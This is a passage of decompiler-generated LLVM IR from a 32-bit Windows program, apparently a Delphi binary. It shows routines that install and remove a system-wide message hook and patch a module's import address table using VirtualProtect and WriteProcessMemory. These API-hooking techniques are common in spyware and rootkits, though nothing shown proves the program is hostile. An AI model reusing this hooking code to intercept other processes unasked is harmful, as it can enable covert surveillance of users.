  br label %dec_label_pc_4074e5, !insn.addr !1870

dec_label_pc_4074e5:                              ; preds = %dec_label_pc_4074d7, %dec_label_pc_4074d3
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !1871
  %29 = mul i32 %28, 4, !insn.addr !1863
  %30 = add i32 %29, %14, !insn.addr !1863
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1863
  %32 = load i32, i32* %31, align 4, !insn.addr !1863
  %33 = icmp eq i32 %32, 0, !insn.addr !1864
  %34 = icmp eq i1 %33, false, !insn.addr !1865
  store i32 %32, i32* %.reg2mem, !insn.addr !1865
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !1865
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !1865
  br i1 %34, label %dec_label_pc_4074d3, label %dec_label_pc_4074ed, !insn.addr !1865

dec_label_pc_4074ed:                              ; preds = %dec_label_pc_4074e5, %dec_label_pc_4074cc
  %35 = call i32 @WSACleanup(), !insn.addr !1872
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !1872
  br label %dec_label_pc_4074f2, !insn.addr !1872

dec_label_pc_4074f2:                              ; preds = %dec_label_pc_4074ed, %dec_label_pc_407494
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1873
}

define i32 @function_407500() local_unnamed_addr {
dec_label_pc_407500:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1874
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1874
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1874
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1875
  %2 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1876
  %3 = add i32 %2, 1, !insn.addr !1876
  store i32 %3, i32* @global_var_4096e0, align 4, !insn.addr !1876
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1877
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1878
  ret i32 0, !insn.addr !1879
}

define i32 @function_407525() local_unnamed_addr {
dec_label_pc_407525:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1880
  ret i32 %0, !insn.addr !1880
}

define i32 @function_40752a() local_unnamed_addr {
dec_label_pc_40752a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1881
}

define i32 @function_40752c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40752c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1882
}

define i32 @function_407530() local_unnamed_addr {
dec_label_pc_407530:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1883
  %2 = add i32 %1, -1, !insn.addr !1883
  store i32 %2, i32* @global_var_4096e0, align 4, !insn.addr !1883
  ret i32 %0, !insn.addr !1884
}

define i32 @function_407538(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407538:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1885
  %2 = call i32 @CallNextHookEx(i32* %1, i32 %arg1, i32 %arg2, i32 %arg3), !insn.addr !1885
  ret i32 %2, !insn.addr !1886
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_407558:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4224312 to i32*), i32 3), !insn.addr !1887
  %2 = ptrtoint i32* %1 to i32, !insn.addr !1887
  store i32 %2, i32* @global_var_4096e8, align 4, !insn.addr !1888
  %3 = icmp eq i32* %1, null, !insn.addr !1889
  %4 = icmp eq i1 %3, false, !insn.addr !1890
  %5 = sext i1 %4 to i32, !insn.addr !1891
  ret i32 %5, !insn.addr !1892
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_407584:
  %0 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1893
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1894
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !1894
  %3 = sext i1 %2 to i32, !insn.addr !1894
  ret i32 %3, !insn.addr !1895
}

define i32 @function_407590() local_unnamed_addr {
dec_label_pc_407590:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1896
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1896
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1896
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1897
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1898
  %3 = add i32 %2, 1, !insn.addr !1898
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1898
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1899
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1900
  ret i32 0, !insn.addr !1901
}

define i32 @function_4075b5() local_unnamed_addr {
dec_label_pc_4075b5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1902
  ret i32 %0, !insn.addr !1902
}

define i32 @function_4075ba() local_unnamed_addr {
dec_label_pc_4075ba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1903
}

define i32 @function_4075bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4075bc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1904
}

define i32 @function_4075c0() local_unnamed_addr {
dec_label_pc_4075c0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1905
  %2 = add i32 %1, -1, !insn.addr !1905
  store i32 %2, i32* @global_var_4096e4, align 4, !insn.addr !1905
  ret i32 %0, !insn.addr !1906
}

define i32* @function_4075c8(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_4075c8:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !1907
  ret i32* %0, !insn.addr !1907
}

define i32 @function_4075d0() local_unnamed_addr {
dec_label_pc_4075d0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1908
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1908
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1908
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1909
  %2 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !1910
  %3 = add i32 %2, 1, !insn.addr !1910
  store i32 %3, i32* @global_var_4096ec, align 4, !insn.addr !1910
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1911
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1912
  ret i32 0, !insn.addr !1913
}

define i32 @function_4075f5() local_unnamed_addr {
dec_label_pc_4075f5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1914
  ret i32 %0, !insn.addr !1914
}

define i32 @function_4075fa() local_unnamed_addr {
dec_label_pc_4075fa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1915
}

define i32 @function_4075fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4075fc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1916
}

define i32 @function_407600() local_unnamed_addr {
dec_label_pc_407600:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !1917
  %2 = add i32 %1, -1, !insn.addr !1917
  store i32 %2, i32* @global_var_4096ec, align 4, !insn.addr !1917
  ret i32 %0, !insn.addr !1918
}

define i32 @function_407660(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407660:
  %esp.1.reg2mem = alloca i32, !insn.addr !1919
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1919
  %eax.0.reg2mem = alloca i32, !insn.addr !1919
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !1920
  %7 = icmp eq i8 %6, 0, !insn.addr !1920
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !1921
  br i1 %7, label %dec_label_pc_407673, label %dec_label_pc_40766b, !insn.addr !1921

dec_label_pc_40766b:                              ; preds = %dec_label_pc_407660
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !1922
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !1922
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !1922
  br label %dec_label_pc_407673, !insn.addr !1922

dec_label_pc_407673:                              ; preds = %dec_label_pc_40766b, %dec_label_pc_407660
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !1923
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1924
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !1924
  %13 = ptrtoint i32* %12 to i32, !insn.addr !1924
  %14 = add i32 %eax.0.reload, 8, !insn.addr !1925
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1925
  store i32 %13, i32* %15, align 4, !insn.addr !1925
  %16 = icmp eq i32* %12, null, !insn.addr !1926
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1927
  br i1 %16, label %dec_label_pc_4076cb, label %dec_label_pc_40768f, !insn.addr !1927

dec_label_pc_40768f:                              ; preds = %dec_label_pc_407673
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !1928
  %18 = add i32 %eax.0.reload, 12, !insn.addr !1929
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1929
  store i32 %17, i32* %19, align 4, !insn.addr !1929
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !1930
  %21 = add i32 %eax.0.reload, 16, !insn.addr !1931
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1931
  store i32 %20, i32* %22, align 4, !insn.addr !1931
  %23 = add i32 %eax.0.reload, 20, !insn.addr !1932
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1932
  store i32 %arg3, i32* %24, align 4, !insn.addr !1932
  %25 = load i32, i32* %22, align 4, !insn.addr !1933
  %26 = add i32 %esp.0, -8, !insn.addr !1934
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1934
  store i32 %25, i32* %27, align 4, !insn.addr !1934
  %28 = add i32 %esp.0, -12, !insn.addr !1935
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1935
  store i32 %17, i32* %29, align 4, !insn.addr !1935
  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !1936
  %31 = ptrtoint i32* %30 to i32, !insn.addr !1936
  %32 = add i32 %esp.0, -16, !insn.addr !1937
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1937
  store i32 %31, i32* %33, align 4, !insn.addr !1937
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1938
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !1938
  %36 = add i32 %eax.0.reload, 24, !insn.addr !1939
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1939
  store i32 %35, i32* %37, align 4, !insn.addr !1939
  %38 = icmp eq i32 ()* %34, null, !insn.addr !1940
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1941
  br i1 %38, label %dec_label_pc_4076cb, label %dec_label_pc_4076b7, !insn.addr !1941

dec_label_pc_4076b7:                              ; preds = %dec_label_pc_40768f
  %39 = load i32, i32* %24, align 4, !insn.addr !1942
  %40 = add i32 %esp.0, -20, !insn.addr !1943
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1943
  store i32 %39, i32* %41, align 4, !insn.addr !1943
  %42 = load i32, i32* %15, align 4, !insn.addr !1944
  %43 = add i32 %esp.0, -24, !insn.addr !1945
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1945
  store i32 %42, i32* %44, align 4, !insn.addr !1945
  %45 = call i32 @function_407734(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1946
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !1946
  br label %dec_label_pc_4076cb, !insn.addr !1946

dec_label_pc_4076cb:                              ; preds = %dec_label_pc_4076b7, %dec_label_pc_40768f, %dec_label_pc_407673
  br i1 %7, label %dec_label_pc_4076e2, label %dec_label_pc_4076d3, !insn.addr !1947

dec_label_pc_4076d3:                              ; preds = %dec_label_pc_4076cb
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !1948
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1949
  %48 = load i32, i32* %47, align 4, !insn.addr !1949
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !1949
  br label %dec_label_pc_4076e2, !insn.addr !1950

dec_label_pc_4076e2:                              ; preds = %dec_label_pc_4076d3, %dec_label_pc_4076cb
  %49 = add i32 %eax.0.reload, 4, !insn.addr !1951
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1951
  %51 = inttoptr i32 %9 to i32*, !insn.addr !1923
  ret i32 %eax.0.reload, !insn.addr !1952
}

define i32 @function_4076ec() local_unnamed_addr {
dec_label_pc_4076ec:
  %eax.1.reg2mem = alloca i32, !insn.addr !1953
  %eax.0.reg2mem = alloca i32, !insn.addr !1953
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !1954
  %4 = add i32 %3, 8, !insn.addr !1955
  %5 = inttoptr i32 %4 to i32*, !insn.addr !1955
  %6 = load i32, i32* %5, align 4, !insn.addr !1955
  %7 = icmp eq i32 %6, 0, !insn.addr !1955
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1956
  br i1 %7, label %dec_label_pc_407726, label %dec_label_pc_4076fd, !insn.addr !1956

dec_label_pc_4076fd:                              ; preds = %dec_label_pc_4076ec
  %8 = add i32 %3, 24, !insn.addr !1957
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1957
  %10 = load i32, i32* %9, align 4, !insn.addr !1957
  %11 = icmp eq i32 %10, 0, !insn.addr !1957
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1958
  br i1 %11, label %dec_label_pc_407726, label %dec_label_pc_407703, !insn.addr !1958

dec_label_pc_407703:                              ; preds = %dec_label_pc_4076fd
  %12 = add i32 %3, 4, !insn.addr !1959
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1959
  %14 = load i32, i32* %13, align 4, !insn.addr !1959
  %15 = inttoptr i32 %14 to i8*, !insn.addr !1960
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !1961
  %17 = ptrtoint i32* %16 to i32, !insn.addr !1961
  %18 = load i32, i32* %5, align 4, !insn.addr !1962
  %19 = icmp eq i32 %18, %17, !insn.addr !1962
  %20 = icmp eq i1 %19, false, !insn.addr !1963
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !1963
  br i1 %20, label %dec_label_pc_407726, label %dec_label_pc_407711, !insn.addr !1963

dec_label_pc_407711:                              ; preds = %dec_label_pc_407703
  %21 = load i32, i32* %9, align 4, !insn.addr !1964
  %22 = call i32 @function_407734(i32 %21), !insn.addr !1965
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !1965
  br label %dec_label_pc_407726, !insn.addr !1965

dec_label_pc_407726:                              ; preds = %dec_label_pc_407711, %dec_label_pc_407703, %dec_label_pc_4076fd, %dec_label_pc_4076ec
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !1966
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !1967
  br i1 %24, label %dec_label_pc_407731, label %dec_label_pc_40772a, !insn.addr !1967

dec_label_pc_40772a:                              ; preds = %dec_label_pc_407726
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !1968
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !1968
  br label %dec_label_pc_407731, !insn.addr !1968

dec_label_pc_407731:                              ; preds = %dec_label_pc_40772a, %dec_label_pc_407726
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !1969
}

define i32 @function_407734(i32 %arg1) local_unnamed_addr {
dec_label_pc_407734:
  %eax.0.reg2mem = alloca i32, !insn.addr !1970
  %esp.0.reg2mem = alloca i32, !insn.addr !1970
  %storemerge6.reg2mem = alloca i32, !insn.addr !1970
  %.reg2mem14 = alloca i32, !insn.addr !1970
  %esp.17.reg2mem = alloca i32, !insn.addr !1970
  %esi.08.reg2mem = alloca i32, !insn.addr !1970
  %.reg2mem = alloca i32, !insn.addr !1970
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !1971
  %4 = icmp eq i1 %3, false, !insn.addr !1972
  %5 = icmp eq i32 %arg1, 0, !insn.addr !1973
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_4077e1, label %dec_label_pc_40775a, !insn.addr !1972

dec_label_pc_40775a:                              ; preds = %dec_label_pc_407734
  %6 = trunc i32 %2 to i16, !insn.addr !1974
  %7 = trunc i32 %1 to i8, !insn.addr !1975
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !1976
  %8 = inttoptr i32 %0 to i32*, !insn.addr !1977
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !1977
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1977
  %11 = icmp eq i32* %9, null, !insn.addr !1978
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1979
  br i1 %11, label %dec_label_pc_4077e1, label %dec_label_pc_4077da.preheader, !insn.addr !1979

dec_label_pc_4077da.preheader:                    ; preds = %dec_label_pc_40775a
  %12 = add i32 %10, 12, !insn.addr !1980
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1980
  %14 = load i32, i32* %13, align 4, !insn.addr !1980
  %15 = icmp eq i32 %14, 0, !insn.addr !1981
  %16 = icmp eq i1 %15, false, !insn.addr !1982
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !1982
  br i1 %16, label %dec_label_pc_407773.lr.ph, label %dec_label_pc_4077e1, !insn.addr !1982

dec_label_pc_407773.lr.ph:                        ; preds = %dec_label_pc_4077da.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1976
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !1983
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_407773

dec_label_pc_407773:                              ; preds = %dec_label_pc_407773.lr.ph, %dec_label_pc_4077d7
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !1984
  %24 = add i32 %esp.17.reload, -4, !insn.addr !1985
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1985
  store i32 %18, i32* %25, align 4, !insn.addr !1985
  %26 = add i32 %esp.17.reload, -8, !insn.addr !1986
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1986
  store i32 %23, i32* %27, align 4, !insn.addr !1986
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !1987
  %29 = icmp eq i32 %28, 0, !insn.addr !1988
  %30 = icmp eq i1 %29, false, !insn.addr !1989
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !1989
  br i1 %30, label %dec_label_pc_4077d7, label %dec_label_pc_407786, !insn.addr !1989

dec_label_pc_407786:                              ; preds = %dec_label_pc_407773
  %31 = add i32 %esi.08.reload, 16, !insn.addr !1990
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1990
  %33 = load i32, i32* %32, align 4, !insn.addr !1990
  %34 = add i32 %33, %arg1, !insn.addr !1991
  %35 = inttoptr i32 %34 to i32*, !insn.addr !1992
  %36 = load i32, i32* %35, align 4, !insn.addr !1992
  %37 = icmp eq i32 %36, 0, !insn.addr !1993
  %38 = icmp eq i1 %37, false, !insn.addr !1994
  store i32 %36, i32* %.reg2mem14, !insn.addr !1994
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !1994
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !1994
  br i1 %38, label %dec_label_pc_40778e, label %dec_label_pc_4077d7, !insn.addr !1994

dec_label_pc_40778e:                              ; preds = %dec_label_pc_407786, %dec_label_pc_4077ce
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !1995
  %40 = icmp eq i1 %39, false, !insn.addr !1996
  br i1 %40, label %dec_label_pc_4077ce, label %dec_label_pc_407793, !insn.addr !1996

dec_label_pc_407793:                              ; preds = %dec_label_pc_40778e
  %41 = add i32 %esp.17.reload, -12, !insn.addr !1997
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1997
  store i32 %20, i32* %42, align 4, !insn.addr !1997
  %43 = add i32 %esp.17.reload, -16, !insn.addr !1998
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1998
  store i32 128, i32* %44, align 4, !insn.addr !1998
  %45 = add i32 %esp.17.reload, -20, !insn.addr !1999
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1999
  store i32 4, i32* %46, align 4, !insn.addr !1999
  %47 = add i32 %esp.17.reload, -24, !insn.addr !2000
  %48 = inttoptr i32 %47 to i32*, !insn.addr !2000
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !2000
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2001
  %50 = add i32 %esp.17.reload, -28, !insn.addr !2002
  %51 = inttoptr i32 %50 to i32*, !insn.addr !2002
  store i32 %21, i32* %51, align 4, !insn.addr !2002
  %52 = add i32 %esp.17.reload, -32, !insn.addr !2003
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2003
  store i32 4, i32* %53, align 4, !insn.addr !2003
  %54 = add i32 %esp.17.reload, -36, !insn.addr !2004
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2004
  store i32 %22, i32* %55, align 4, !insn.addr !2004
  %56 = add i32 %esp.17.reload, -40, !insn.addr !2005
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2005
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !2005
  %58 = call i32* @GetCurrentProcess(), !insn.addr !2006
  %59 = ptrtoint i32* %58 to i32, !insn.addr !2006
  %60 = add i32 %esp.17.reload, -44, !insn.addr !2007
  %61 = inttoptr i32 %60 to i32*, !insn.addr !2007
  store i32 %59, i32* %61, align 4, !insn.addr !2007
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2008
  %63 = add i32 %esp.17.reload, -48, !insn.addr !2009
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2009
  store i32 %21, i32* %64, align 4, !insn.addr !2009
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !2010
  %66 = add i32 %esp.17.reload, -52, !insn.addr !2011
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2011
  store i32 %65, i32* %67, align 4, !insn.addr !2011
  %68 = add i32 %esp.17.reload, -56, !insn.addr !2012
  %69 = inttoptr i32 %68 to i32*, !insn.addr !2012
  store i32 4, i32* %69, align 4, !insn.addr !2012
  %70 = add i32 %esp.17.reload, -60, !insn.addr !2013
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2013
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !2013
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2014
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !2015
  br label %dec_label_pc_4077d7, !insn.addr !2015

dec_label_pc_4077ce:                              ; preds = %dec_label_pc_40778e
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !2016
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1992
  %75 = load i32, i32* %74, align 4, !insn.addr !1992
  %76 = icmp eq i32 %75, 0, !insn.addr !1993
  %77 = icmp eq i1 %76, false, !insn.addr !1994
  store i32 %75, i32* %.reg2mem14, !insn.addr !1994
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !1994
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !1994
  br i1 %77, label %dec_label_pc_40778e, label %dec_label_pc_4077d7, !insn.addr !1994

dec_label_pc_4077d7:                              ; preds = %dec_label_pc_4077ce, %dec_label_pc_407786, %dec_label_pc_407793, %dec_label_pc_407773
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !2017
  %79 = add i32 %esi.08.reload, 32, !insn.addr !1980
  %80 = inttoptr i32 %79 to i32*, !insn.addr !1980
  %81 = load i32, i32* %80, align 4, !insn.addr !1980
  %82 = icmp eq i32 %81, 0, !insn.addr !1981
  %83 = icmp eq i1 %82, false, !insn.addr !1982
  store i32 %81, i32* %.reg2mem, !insn.addr !1982
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !1982
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !1982
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !1982
  br i1 %83, label %dec_label_pc_407773, label %dec_label_pc_4077e1, !insn.addr !1982

dec_label_pc_4077e1:                              ; preds = %dec_label_pc_4077d7, %dec_label_pc_4077da.preheader, %dec_label_pc_40775a, %dec_label_pc_407734
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2018
}

define i32 @function_4077ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4077ec:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !2019
  %2 = inttoptr i32 %1 to i32*, !insn.addr !2019
  %3 = load i32, i32* %2, align 4, !insn.addr !2019
  ret i32 %3, !insn.addr !2020
}

define i32 @function_4077f0() local_unnamed_addr {
dec_label_pc_4077f0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2021
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2021
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2021
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2022
  %2 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2023
  %3 = add i32 %2, 1, !insn.addr !2023
  store i32 %3, i32* @global_var_4096f0, align 4, !insn.addr !2023
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2024
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2025
  ret i32 0, !insn.addr !2026
}

define i32 @function_407815() local_unnamed_addr {
dec_label_pc_407815:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2027
  ret i32 %0, !insn.addr !2027
}

define i32 @function_40781a() local_unnamed_addr {
dec_label_pc_40781a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2028
}

define i32 @function_40781c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40781c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2029
}

define i32 @function_407820() local_unnamed_addr {
dec_label_pc_407820:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2030
  %2 = add i32 %1, -1, !insn.addr !2030
  store i32 %2, i32* @global_var_4096f0, align 4, !insn.addr !2030
  ret i32 %0, !insn.addr !2031
}

define i32 @function_407828(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_407828:
  %0 = call i32 @__decompiler_undefined_function_0()
